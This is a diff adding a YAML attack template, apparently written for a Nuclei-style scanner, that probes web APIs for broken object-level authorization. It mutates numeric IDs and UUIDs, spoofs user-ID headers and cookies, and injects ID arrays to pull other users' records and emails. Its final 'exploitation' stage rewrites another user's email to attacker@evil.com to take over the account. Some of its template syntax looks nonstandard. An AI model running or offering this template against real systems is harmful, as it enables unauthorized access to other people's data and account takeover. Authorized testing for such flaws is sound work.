@@ -1,0 +1,173 @@
+id: bola-god
+name: BOLA – God Level (IDOR, UUID, Arrays, Headers, Wildcards)
+severity: high
+impact: Attacker can view, modify, or delete other users' resources.
+chain: Combine with Mass Assignment to escalate to admin.
+
+variables:
+  own_id: 0
+  own_email: ""
+  own_uuid: ""
+
+requests:
+  # Stage 1: Harvest own identity
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/me"
+      - "{{BaseURL}}/api/v1/users/self"
+      - "{{BaseURL}}/profile"
+    matchers:
+      - type: status
+        status: 200
+      - type: header
+        name: Content-Type
+        value: application/json
+      - type: regex
+        part: body
+        regex:
+          - '"id":\s*(\d+)'
+          - '"email":\s*"([^"]+)"'
+    extractors:
+      - type: regex
+        name: own_id
+        regex:
+          - '"id":\s*(\d+)'
+      - type: regex
+        name: own_email
+        regex:
+          - '"email":\s*"([^"]+)"'
+      - type: regex
+        name: own_uuid
+        regex:
+          - '"id":\s*"([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})"'
+
+  # Stage 2: Numeric ID mutation
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user/{{ID}}"
+      - "{{BaseURL}}/api/orders/{{ID}}"
+    payloads:
+      ID:
+        - "{{own_id|int + 1}}"
+        - "{{own_id|int - 1}}"
+        - "{{own_id|int * 2}}"
+        - "1,2,3,4,5,6,7,8,9,10"
+        - "100,200,300"
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+    matchers:
+      - type: status
+        status: 200
+      - type: header
+        name: Content-Type
+        value: application/json
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<html"
+          - "{{own_email}}"
+      - type: regex
+        part: body
+        regex:
+          - '"email":\s*"([^"]+)"'
+    extractors:
+      - type: regex
+        name: victim_email
+        regex:
+          - '"email":\s*"([^"]+)"'
+
+  # Stage 3: UUID mutation
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user/{{UUID}}"
+    payloads:
+      UUID:
+        - "{{own_uuid|replace_last_char(1)}}"
+        - "00000000-0000-0000-0000-000000000000"
+        - "11111111-1111-1111-1111-111111111111"
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+    matchers:
+      - type: status
+        status: 200
+      - type: header
+        name: Content-Type
+        value: application/json
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "{{own_email}}"
+
+  # Stage 4: Header injection (X-User-ID, Cookie)
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/dashboard"
+    headers:
+      X-User-ID: "{{own_id|int + 1}}"
+      Cookie: "user_id={{own_id|int + 1}}"
+    matchers:
+      - type: status
+        status: 200
+      - type: header
+        name: Content-Type
+        value: application/json
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "{{own_email}}"
+
+  # Stage 5: Array injection (batch BOLA)
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/users?ids[]={{own_id|int + 1}}&ids[]={{own_id|int + 2}}"
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+    matchers:
+      - type: status
+        status: 200
+      - type: header
+        name: Content-Type
+        value: application/json
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "{{own_email}}"
+
+verification:
+  # Confirm that the victim's email is different from our own and appears in the response
+  - method: GET
+    path: "{{BaseURL}}/api/user/{{own_id|int + 2}}"
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+    matchers:
+      - type: status
+        status: 200
+      - type: header
+        name: Content-Type
+        value: application/json
+      - type: regex
+        part: body
+        regex:
+          - '"email":\s*"([^"]+)"'
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "{{own_email}}"
+
+exploitation:
+  # Change another user's email to prove impact
+  - method: PUT
+    path: "{{BaseURL}}/api/user/{{own_id|int + 1}}"
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+      Content-Type: application/json
+    body: |
+      {"email": "attacker@evil.com"}
+    extract:
+      type: status
+      expected: 200
